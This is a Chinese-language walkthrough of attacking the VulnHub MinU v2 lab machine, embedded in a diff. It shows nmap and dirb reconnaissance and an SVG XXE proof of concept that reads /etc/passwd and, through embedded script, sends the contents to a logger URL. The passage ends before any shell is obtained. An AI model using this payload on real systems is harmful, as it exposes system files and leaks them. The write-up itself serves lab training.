@@ -1,0 +1,64 @@
+I"�#<h1 id="序言">序言</h1>
+<p>hello,各位。最近闲来无事，工作之余偷偷用公司电脑测试入侵了一个linux靶机，遂记录下。（手动狗头）
+这个靶机本身难度适中，复现了svg的代码执行漏洞且要求对linux的系统命令较为熟悉；svg大体来说是一种图像文件格式，基于XML，由W3C联盟进行开发的，支持网页打开，编辑方便等。可以自行深入搜索~各位大佬见笑。</p>
+<h2 id="一靶机简介">一、靶机简介</h2>
+<p>minUv2<br />
+下载地址
+Download (Mirror): https://download.vulnhub.com/minu/MinUv2.ova.7z
+Download (Torrent): https://download.vulnhub.com/minu/MinUv2.ova.7z.torrent</p>
+<h2 id="二实战">二、实战</h2>
+<p>江湖规矩，神器开路：首先先用<code class="highlighter-rouge">Nmap</code>扫描确定靶机地址。发现靶机ip。
+这里靶机只支持vbox，所以得桥接通信，打码请谅解~
+<img src="https://p2.ssl.qhimg.com/t0167faf934cb9977ca.png" alt="" />
+确定ip直接端口扫描~
+<img src="https://p4.ssl.qhimg.com/t011687f39e33bbe3e4.png" alt="" />
+发现只开放了两个端口：<code class="highlighter-rouge">22、3306</code>端口。22端口暂时先放着不管，咱们看看3306端口。
+是一个web页面，emmmm.主角登场，svg图像~
+<img src="https://p0.ssl.qhimg.com/t019035849ce7a48ccf.png" alt="" /></p>
+<h2 id="三发现漏洞">三、发现漏洞</h2>
+<p>小弟赶紧dirb扫描一波，果然有发现。<br /></p>
+<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="c1">#扫描3306端口下的html后缀的文件</span><span class="w">
+</span><span class="nv">dirb</span><span class="w"> </span><span class="nv">http</span><span class="p">:</span><span class="o">//</span><span class="err">$_</span><span class="nv">ip</span><span class="p">:</span><span class="nv">port</span><span class="w"> </span><span class="o">-</span><span class="nv">X</span><span class="w"> </span><span class="p">.</span><span class="nv">html</span><span class="w">
+</span><span class="c1">--------------</span><span class="w">
+</span><span class="o">+</span><span class="w"> </span><span class="nv">http</span><span class="p">:</span><span class="o">//</span><span class="err">$_</span><span class="nv">ip</span><span class="p">:</span><span class="nv">port</span><span class="o">/</span><span class="nv">upload</span><span class="p">.</span><span class="nv">html</span><span class="w"> </span><span class="p">(</span><span class="nv">CODE</span><span class="p">:</span><span class="mi">200</span><span class="err">|</span><span class="nv">SIZE</span><span class="p">:</span><span class="mi">908</span><span class="p">)</span><span class="w">
+</span><span class="c1">--------------</span><span class="w">
+</span><span class="nv">DOWNLOADED</span><span class="p">:</span><span class="w"> </span><span class="mi">4612</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">FOUND</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>发现了上传网页，且只能上传svg、img文件，又惊又喜。exp搜索一哈找到poc，验证一下漏洞的存在。poc代码如下：</p>
+<div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre><span class="c1">#poc上传上去页面回显</span><span class="w">
+</span><span class="c1">#&lt;!DOCTYPE svg [</span><span class="w">
+</span><span class="o">&lt;</span><span class="p">!</span><span class="nv">ELEMENT</span><span class="w"> </span><span class="nv">svg</span><span class="w"> </span><span class="nv">ANY</span><span class="w"> </span><span class="o">&gt;</span><span class="w">
+</span><span class="o">&lt;</span><span class="p">!</span><span class="nv">ENTITY</span><span class="w"> </span><span class="nv">xxe</span><span class="w"> </span><span class="nv">SYSTEM</span><span class="w"> </span><span class="s2">"/etc/passwd"</span><span class="o">&gt;</span><span class="w">
+</span><span class="err">]</span><span class="o">&gt;</span><span class="w">
+</span><span class="o">&lt;</span><span class="nv">svg</span><span class="w"> </span><span class="nb">version</span><span class="o">=</span><span class="s2">"1.0"</span><span class="w"> </span><span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://www.w3.org/2000/svg"</span><span class="w"> </span><span class="na">width</span><span class="o">=</span><span class="s2">"19000px"</span><span class="w"> </span><span class="nv">xmlns</span><span class="p">:</span><span class="nv">xlink</span><span class="o">=</span><span class="s2">"http://www.w3.org/1999/xlink"</span><span class="w"> </span><span class="o">&gt;</span><span class="w">
+</span><span class="o">&lt;</span><span class="nb">text</span><span class="w"> </span><span class="nv">x</span><span class="o">=</span><span class="s2">"-1000"</span><span class="w"> </span><span class="nv">y</span><span class="o">=</span><span class="s2">"-1000"</span><span class="w"> </span><span class="o">&gt;&amp;</span><span class="nv">xxe</span><span class="err">;</span><span class="o">&lt;/</span><span class="nb">text</span><span class="o">&gt;</span><span class="w">
+</span><span class="o">&lt;</span><span class="nv">circle</span><span class="w"> </span><span class="nv">cx</span><span class="o">=</span><span class="s2">"50"</span><span class="w"> </span><span class="nv">cy</span><span class="o">=</span><span class="s2">"50"</span><span class="w"> </span><span class="nv">r</span><span class="o">=</span><span class="s2">"40"</span><span class="w"> </span><span class="nv">stroke</span><span class="o">=</span><span class="s2">"black"</span><span class="w"> </span><span class="nv">stroke</span><span class="o">-</span><span class="na">width</span><span class="o">=</span><span class="s2">"3"</span><span class="w"> 		</span><span class="nv">fill</span><span class="o">=</span><span class="s2">"red"</span><span class="w"> </span><span class="o">/&gt;</span><span class="w">
+</span><span class="o">&lt;</span><span class="nv">script</span><span class="o">&gt;</span><span class="w">
+</span><span class="nv">var</span><span class="w"> </span><span class="nv">logger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"http://localhost/?file="</span><span class="w"> </span><span class="o">+</span><span class="w">
+</span><span class="nv">encodeURIComponent</span><span class="p">(</span><span class="na">document</span><span class="p">.</span><span class="nv">getElementsByTagName</span><span class="p">(</span><span class="s2">"text"</span><span class="p">)</span><span class="w">	</span><span class="err">[</span><span class="mi">0</span><span class="err">]</span><span class="p">.</span><span class="nv">innerHTML</span><span class="p">)</span><span class="err">;</span><span class="w">
+</span><span class="na">document</span><span class="p">.</span><span class="nv">createElementNS</span><span class="p">(</span><span class="err">'</span><span class="nv">http</span><span class="p">:</span><span class="o">//</span><span class="nv">www</span><span class="p">.</span><span class="nv">w3</span><span class="p">.</span><span class="nv">org</span><span class="o">/</span><span class="mi">2000</span><span class="o">/</span><span class="nv">svg</span><span class="err">'</span><span class="p">,</span><span class="err">'</span><span class="na">image</span><span class="err">'</span><span class="p">).</span><span class="nv">setAttributeNS</span><span class="p">(</span><span class="err">'</span><span class="nv">http</span><span class="p">:</span><span class="o">//</span><span class="nv">www</span><span class="p">.</span><span class="nv">w3</span><span class="p">.</span><span class="nv">org</span><span class="o">/</span><span class="mi">1999</span><span class="o">/</span><span class="nv">xlink</span><span class="err">'</span><span class="p">,</span><span class="err">'</span><span class="nv">href</span><span class="err">'</span><span class="p">,</span><span class="w"> </span><span class="nv">logger</span><span class="p">)</span><span class="err">;</span><span class="w">
+</span><span class="o">&lt;/</span><span class="nv">script</span><span class="o">&gt;&lt;/</span><span class="nv">svg</span><span class="o">&gt;</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p><br />
+果然有<code class="highlighter-rouge">xxe</code>漏洞，但是验证了漏洞不能让我们有实际的渗透进展，只能对一些文件内容进行查看，无法得到shell，要怎么办呢？
+<img src="https://p1.ssl.qhimg.com/t0163eb735e597071e2.png" alt="" /></p>
+:ET
